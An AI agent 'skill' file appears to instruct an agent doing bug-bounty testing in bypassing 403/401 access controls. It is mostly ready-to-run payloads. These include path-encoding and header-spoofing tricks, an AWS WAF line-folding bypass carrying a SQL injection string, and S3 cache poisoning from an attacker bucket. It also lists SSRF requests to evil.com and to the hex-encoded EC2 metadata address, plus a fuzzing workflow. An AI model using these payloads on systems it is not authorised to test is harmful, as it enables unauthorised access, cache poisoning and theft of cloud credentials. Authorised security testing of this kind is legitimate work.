# 403/401 Bypass Skill

Use this skill when you encounter a 403 Forbidden or 401 Unauthorized response and want to bypass access controls. Work through each technique systematically. All requests go through Burp.

---

## 1. Path/URL Manipulation

### Trailing special characters (Nginx + backend trim() desync)
Append characters that the backend strips but Nginx doesn't normalize:

| Backend | Bypass characters |
|---------|------------------|
| Node.js (Nginx ≤1.20) | `\xA0`, `\x09`, `\x0C` |
| Node.js (Nginx ≥1.21) | `\xA0` |
| Flask (Nginx ≤1.20) | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| Flask (Nginx ≥1.21) | `\x85`, `\xA0` |
| Spring Boot (Nginx ≤1.20) | `\x09`, `;` |
| Spring Boot (Nginx ≥1.21) | `;` |

```
GET /admin\xA0 HTTP/1.1
GET /admin\x85 HTTP/1.1
GET /admin; HTTP/1.1
```

### Path variations
```
/admin
/admin/
/admin/.
/admin//
/admin/./
//admin
/./admin
/%2fadmin
/admin%20
/admin%09
/ADMIN
/Admin
/%61dmin
/admin%00
/admin..;/
/admin;/
/%2e/admin
/%252e/admin
/../admin
/.../admin
/..%00/admin
/..%01/admin
/..%0a/admin
/..%0d/admin
/..%09/admin
/~admin
/%20/admin
/%2e%2e/admin
/%252e%252e/admin
/%c0%af/admin
/%e0%80%af/admin
```

### Path traversal prefix
```
/anything/../admin
/public/../admin
```

### Matrix parameter prefix (Spring Boot)
Spring accepts `;` before the first slash — useful for SSRF and ACL bypass:
```
GET ;1337/admin HTTP/1.1
GET ;@evil.com/url HTTP/1.1   ← SSRF if backend concatenates full URI
```

### PHP-FPM double extension
If Nginx blocks `/admin.php` but passes `*.php` to FPM:
```
GET /admin.php/index.php HTTP/1.1
```
PHP matches the first `.php` file, ignoring the rest.

---

## 2. HTTP Method Manipulation

```
GET /admin → 403?
POST /admin
PUT /admin
PATCH /admin
DELETE /admin
HEAD /admin
OPTIONS /admin
TRACE /admin
CONNECT /admin
FOO /admin    ← non-existent method, sometimes bypasses checks
```

Override method via headers:
```
X-HTTP-Method-Override: GET
X-Method-Override: GET
_method=GET
```

---

## 3. Header Manipulation

### IP spoofing headers
```
X-Forwarded-For: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Proto: https
X-Forwarded-Server: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Trusted-IP: 127.0.0.1
X-Requested-By: 127.0.0.1
X-Requested-For: 127.0.0.1
Forwarded: for=127.0.0.1
Via: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
```

IP values to try: `127.0.0.1`, `127.0.0.1:80`, `127.0.0.1:443`, `localhost`, `10.0.0.1`, `172.16.0.0`

### Rewrite/proxy headers
```
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
X-Forward-For: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
```

### Referer / Origin tricks
```
Referer: https://target.com/admin
Origin: https://target.com
```

### Host header variations
```
Host: localhost
Host: 127.0.0.1
Host: target.com:80
Host: target.com:443
Host: target.com:8080
```

---

## 4. AWS WAF Bypass — Header Line Folding

WAF sees `X-Query: Value` (no payload). Backend (Node.js/Flask) folds the next line into the header value:

```
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' --\r\n
Connection: close\r\n
\r\n
```

The `\t` (`\x09`) on the next line causes the backend to interpret it as continuation of `X-Query`. AWS WAF treats it as a separate header name and misses the payload. Fixed by AWS in 2022 but worth testing on older setups.

---

## 5. HTTP Desync / Cache Poisoning (S3 + Cache Server)

If the target uses a cache server in front of S3:

Bytes ignored by S3 in header names: `\x1f \x1d \x0c \x1e \x1c \x0b`

Cache server treats `\x1dHost` as an unkeyed header → uses real `Host` for cache key.
S3 treats `\x1dHost` as the real Host → fetches from evil bucket.

```
GET / HTTP/1.1
[\x1d]Host: evilbucket.s3.amazonaws.com
Host: victim.s3.amazonaws.com
Connection: close
```

Result: cache poisoned with content from `evilbucket`.

---

## 6. SSRF via Incorrect Pathname Parsing

### Flask — `@` in pathname
If Flask app concatenates `SITE_NAME + path` without trailing slash:
```
GET @evil.com/ HTTP/1.1
Host: target.com
```
Flask accepts `@` in path → `https://google.com@evil.com/` → fetches `evil.com`.

### Spring Boot — matrix param + `@`
```
GET ;@evil.com/url HTTP/1.1
Host: target.com
```

### PHP built-in server — `*` prefix + dotless hex IP
```
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
```
`0xa9fea9fe` = `169.254.169.254` (EC2 metadata). Dots not allowed — use hex encoding.

---

## 7. Protocol / Version Tricks

```
# Try HTTP instead of HTTPS
# Try HTTP/1.0 (also try removing Host header entirely with 1.0)
GET /admin HTTP/1.0

# Try HTTP/0.9, 1.1, 2
# Try different port
https://target.com:8443/admin
http://target.com:8080/admin
```

---

## 8. User-Agent Fuzzing

Sometimes access controls differ by browser/OS. Try uncommon or legacy UAs:
```
Mozilla/5.0 (X11; Linux i686; U;rv: 1.7.13) Gecko/20070322 Kazehakase/0.4.4.1
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801
Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01
Googlebot/2.1 (+http://www.google.com/bot.html)
```

---

## 9. Case Switching

```
/admin   → /Admin
/admin   → /ADMIN
/admin   → /aDmIn
/user    → /User
/user    → /%75ser    ← URL-encoded lowercase 'u'
```

---

## 10. Hop-by-Hop Header Abuse

Add sensitive headers to the `Connection` header to instruct proxies to strip them before forwarding. If an upstream proxy adds an auth/IP header that the backend trusts, stripping it may bypass the check:

```
GET /admin HTTP/1.1
Host: target.com
Connection: X-Forwarded-For
X-Forwarded-For: 127.0.0.1
```

Headers worth trying in `Connection`:
```
X-Forwarded-For, X-Real-IP, Authorization, X-Auth-Token,
Accept-Encoding, Transfer-Encoding, X-Custom-Auth
```

---

## 11. Spring Framework Suffix Pattern (< 5.3)

Versions before 5.3 have `useSuffixPatternMatch=true` by default. A route mapped to `/admin` also matches `/admin.*`:
```
/admin.json
/admin.css
/admin.html
/admin.js
/admin.anything
```

---

## 12. Wordlists & Tools

Reference payloads: https://github.com/jagat-singh-chaudhary/403-and-401-Bypass-Techniques/blob/main/Payloads
HackTricks reference: https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/403-and-401-bypasses.html

Quick ffuf sweep for path variations:
```bash
ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Fuzzing/403-bypass-paths.txt \
  -mc 200,301,302 -ac -o 403-bypass.json -of json
```

Analyze results:
```bash
python3 ~/.kiro/skills/fuzzing-skill/ffuf_helper.py analyze 403-bypass.json
```

---

## Workflow

1. Note the blocked endpoint and status code (403 vs 401)
2. Identify the stack: Nginx version? Backend (Node/Flask/Spring/PHP)? WAF? Cache? S3?
3. Try path variations first (fastest)
4. Try header spoofing (X-Forwarded-For, X-Original-URL)
5. Try method override
6. If Nginx detected: try trim() desync characters matching the backend
7. If AWS WAF detected: try line folding
8. If S3 + cache detected: try desync cache poisoning
9. If proxy concatenates full URI: test SSRF via `@` or `;@` prefix
10. Log all attempts and results to the subdomain note in BB-Mapper
